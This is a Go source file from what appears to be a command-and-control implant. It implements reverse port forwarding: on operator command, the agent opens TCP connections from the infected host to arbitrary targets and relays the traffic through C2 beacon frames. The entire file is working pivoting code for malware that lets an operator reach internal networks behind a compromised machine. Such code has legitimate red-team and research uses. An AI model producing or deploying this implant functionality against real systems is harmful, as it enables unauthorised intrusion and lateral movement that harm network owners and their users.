//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"net"
	"sync"
	"time"
)

// rportfwdConn tracks a single reverse-port-forward (pivot) connection. The
// agent dials `target` on behalf of the operator (who connected to the C2
// server's rportfwd listener); bytes read from the target are buffered as
// rportfwd_data frames for the next beacon, and rportfwd_data frames from the
// server are written through to the target.
var (
	rportfwdConns  = make(map[uint64]*rportfwdConn)
	rportfwdMu     sync.Mutex
	rportfwdNextID uint64
)

type rportfwdConn struct {
	connID   uint64
	target   string
	tcpConn  net.Conn
	mu       sync.Mutex
	closed   bool
	outbound []socksFrame
}

func rportfwdCollectOutbound() []socksFrame {
	rportfwdMu.Lock()
	defer rportfwdMu.Unlock()
	var frames []socksFrame
	for connID, rc := range rportfwdConns {
		rc.mu.Lock()
		if len(rc.outbound) > 0 {
			frames = append(frames, rc.outbound...)
			rc.outbound = nil
		}
		// Reap closed legs only AFTER their residual bytes have been drained
		// (covers both peer-close and dial-failure tombstones; previously the
		// tombstones were never removed and grew the map without bound).
		if rc.closed && len(rc.outbound) == 0 {
			delete(rportfwdConns, connID)
		}
		rc.mu.Unlock()
	}
	return frames
}

func rportfwdHandleFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "rportfwd_connect":
			go rportfwdDial(f.ConnID, string(f.Data))
		case "rportfwd_data":
			rportfwdWrite(f.ConnID, f.Data)
		case "rportfwd_close":
			rportfwdClose(f.ConnID)
		}
	}
}

func rportfwdDial(connID uint64, target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		rportfwdMu.Lock()
		rc := &rportfwdConn{connID: connID, target: target, closed: true}
		rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_error", Data: []byte(err.Error())})
		rportfwdConns[connID] = rc
		rportfwdMu.Unlock()
		return
	}

	rc := &rportfwdConn{
		connID:  connID,
		target:  target,
		tcpConn: conn,
	}
	rportfwdMu.Lock()
	rportfwdConns[connID] = rc
	rportfwdMu.Unlock()

	rc.mu.Lock()
	rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_connected"})
	rc.mu.Unlock()

	go func() {
		buf := make([]byte, 10240)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				rportfwdClose(connID)
				return
			}
			rc.mu.Lock()
			if len(rc.outbound) >= socksMaxConnOut {
				rc.outbound = rc.outbound[1:]
			}
			rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_data", Data: append([]byte{}, buf[:n]...)})
			rc.mu.Unlock()
		}
	}()
}

func rportfwdWrite(connID uint64, data []byte) {
	// Read closed under the map lock (it is written under the same lock in
	// rportfwdClose) — reading it after unlocking was a data race.
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	closed := !ok || rc.closed
	rportfwdMu.Unlock()
	if closed {
		return
	}
	rc.mu.Lock()
	defer rc.mu.Unlock()
	if rc.tcpConn != nil {
		rc.tcpConn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		if _, err := rc.tcpConn.Write(data); err != nil {
			// A dead target leg must not linger: without this the entry
			// stays live, keeps buffering frames and silently drops them.
			rc.closed = true
			rc.tcpConn.Close()
			go rportfwdClose(connID)
		}
	}
}

// rportfwdClose marks the leg closed. The entry and any still-buffered
// outbound bytes are kept until rportfwdCollectOutbound has drained them —
// deleting here silently dropped the final window of target->server data.
func rportfwdClose(connID uint64) {
	rportfwdMu.Lock()
	if rc, ok := rportfwdConns[connID]; ok {
		rc.mu.Lock()
		rc.closed = true
		if rc.tcpConn != nil {
			rc.tcpConn.Close()
			rc.tcpConn = nil
		}
		rc.mu.Unlock()
	}
	rportfwdMu.Unlock()
}
